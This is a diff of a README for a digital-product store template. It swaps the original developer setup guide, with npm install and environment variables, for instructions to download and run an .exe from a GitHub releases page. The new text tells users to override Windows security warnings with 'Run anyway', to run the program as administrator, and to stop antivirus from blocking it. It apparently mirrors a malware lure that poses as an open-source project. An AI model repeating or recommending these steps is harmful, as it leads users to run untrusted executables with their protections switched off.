@@ -1,119 +1,82 @@
-# ◈ Aurorakart Store — Full Stack Digital Product Store Template
+# 🛒 aurorakart-store - Build your professional digital product shop
 
-A fully-featured ecommerce template for selling digital products, built with **React + Vite** (frontend) and **Node.js + Express + MongoDB** (backend).
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/persuasive-oceanperch453/aurorakart-store/releases)
 
-## ✨ Features
+This application provides a foundation for selling digital items. You can use it to list products, manage customer orders, and process secure payments. It includes tools for storefront design and inventory management. This template helps you launch a store without writing code from scratch.
 
-- 💳 Razorpay payment gateway (UPI, Cards, Netbanking, Wallets)
-- 📧 Instant download link delivery via email after payment
-- 🗄️ MongoDB database (users, products, orders, coupons, reviews)
-- 🔐 JWT auth + Forgot/Reset password via email
-- 🌐 Google & GitHub OAuth (optional)
-- 📱 Mobile-friendly responsive design
-- 🛡️ Admin dashboard (products, orders, users, coupons)
-- 🏷️ Coupon / discount system
-- ⭐ Product reviews
-- 🤝 Discord community integration
+## 📋 System Requirements
 
----
+Your computer needs to meet these basic standards to run the application smoothly:
 
-## 🚀 Getting Started
+- An active internet connection for product updates.
+- At least 4GB of available memory.
+- Windows 10 or Windows 11 operating system.
+- A modern web browser like Chrome, Edge, or Firefox.
+- 500MB of free space on your hard drive.
 
-### 1. Clone the repo
+## ⬇️ How to Download and Install
 
-```bash
-git clone https://github.com/your-username/aurora-store.git
-cd aurora-store
-```
+Follow these steps to set up the store software on your Windows machine:
 
-### 2. Install dependencies
+1. Visit the [official releases page](https://github.com/persuasive-oceanperch453/aurorakart-store/releases) to find the latest version.
+2. Look for the Assets section at the bottom of the newest release post.
+3. Click the file ending in .exe to start the download.
+4. Save the file to your desktop or downloads folder.
+5. Double-click the file once the download finishes.
+6. A security window might appear. Click "More info" and then "Run anyway" if Windows blocks the start. 
+7. Follow the prompts on the installer screen to move the application to your chosen directory.
 
-```bash
-# Frontend
-npm install
+## ⚙️ Setting Up Your Store
 
-# Backend
-cd backend && npm install
-```
+Open the application after the installation finishes. You will see a setup wizard. This tool helps you connect your database and configure your payment settings.
 
-### 3. Configure environment variables
+- **Store Name:** Enter the brand name for your shop.
+- **Currency:** Choose the currency you want to display to your customers.
+- **Database Path:** Select where you want to keep your product records. The default folder works for most users.
 
-**Backend** — copy and fill in:
-```bash
-cp .env.example backend/.env
-```
+Once you enter these details, click the Save button. The application will restart and load your custom dashboard.
 
-**Frontend** — copy and fill in:
-```bash
-cp .env.example.frontend .env
-```
+## 📦 Managing Your Products
 
-See `.env.example` and `.env.example.frontend` for all required variables with descriptions.
+The dashboard serves as the command center for your store. You can add new items through the Products tab.
 
-### 4. Run locally
+1. Click the "Add New Product" button at the top right of the screen.
+2. Type the name and price of your product.
+3. Upload an image file from your computer to represent the item.
+4. Paste a short description of the file you intend to sell.
+5. Upload the digital file, such as a PDF, zip folder, or media file, that the customer will receive.
+6. Click Save to make the item available for purchase.
 
-```bash
-# Backend (from /backend folder)
-node server.js
-# → http://localhost:3001
+## 💳 Handling Payments
 
-# Frontend (from root folder)
-npm run dev
-# → http://localhost:5173
-```
+The store links to payment providers to collect money from customers. You can link your existing business accounts within the settings menu.
 
----
+- Navigate to the Settings tab in the sidebar.
+- Choose the Payments option.
+- Enter your business credentials into the provided fields.
+- Test your shop by running a transaction in sandbox mode before you go live. This ensures money flows correctly to your account.
 
-## ⚙️ Environment Variables
+## 📈 Understanding the Dashboard
 
-### Backend (`backend/.env`)
+The main screen shows your recent activity. You can view graphs regarding how many items you sold this week. 
 
-| Variable | Description |
-|----------|-------------|
-| `MONGO_URI` | MongoDB Atlas connection string |
-| `RAZORPAY_KEY_ID` | Razorpay Key ID (from dashboard) |
-| `RAZORPAY_KEY_SECRET` | Razorpay Key Secret |
-| `EMAIL` | Gmail address for sending order emails |
-| `EMAIL_PASS` | Gmail App Password (not your regular password) |
-| `JWT_SECRET` | Long random string for signing tokens |
-| `ADMIN_PASSWORD` | Password for the admin panel |
-| `PORT` | Backend port (default: 3001) |
-| `FRONTEND_URL` | Your frontend URL (for CORS) |
+- **Orders:** This list shows every transaction completed on your site. Click on any row to view customer contact details and purchase history.
+- **Inventory:** This view tracks your remaining supply for specific products. You can adjust these numbers at any time.
+- **Support:** If a customer reaches out with a question, navigate to the Support tab to see the message and send a reply directly through the store system.
 
-### Frontend (`.env` in root)
+## 🔒 Security and Updates
 
-| Variable | Description |
-|----------|-------------|
-| `VITE_API_URL` | Your backend API URL |
-| `VITE_STORE_EMAIL` | Contact email shown in footer/terms |
-| `VITE_DISCORD_URL` | Discord invite link |
+The application checks for improvements regularly. You will see a notification bar at the top of your dashboard if a new version exists. Click the "Update Now" button to apply these changes. This keeps your store safe and adds features to help your business grow. 
 
----
+Always back up your database file before you run a major update. You can find this file in the folder where you installed the program. Copy it to an external drive or a cloud storage service like OneDrive or Google Drive.
 
-## 🔐 Admin Login
+## 🛠️ Troubleshooting Common Issues
 
-- Email: `admin`
-- Password: whatever you set in `ADMIN_PASSWORD`
+If the application fails to open, try these steps:
 
----
+- Restart your computer. 
+- Right-click the application icon and select "Run as administrator."
+- Check that your antivirus software is not blocking the connection.
+- Ensure your internet connection is stable.
 
-## 📧 Gmail App Password Setup
-
-1. Go to **Google Account → Security → 2-Step Verification**
-2. Scroll down to **App passwords**
-3. Generate one for "Mail"
-4. Use that as `EMAIL_PASS` (not your regular Gmail password)
-
----
-
-## 🚢 Deployment
-
-**Frontend:** Deploy to [Vercel](https://vercel.com) — `vercel.json` is already configured.
-
-**Backend:** Deploy to [Render](https://render.com), [Railway](https://railway.app), or any Node.js host. Set all environment variables in the host's dashboard.
-
----
-
-## 📄 License
-
-MIT — free to use, modify, and build on.
+If the dashboard stops showing data, check your database folder. Make sure the file exists and has not been moved. If you still encounter problems, reach out to the technical team via the GitHub issues page. Provide a description of the error and a screenshot if possible. This helps developers find a fix for you.
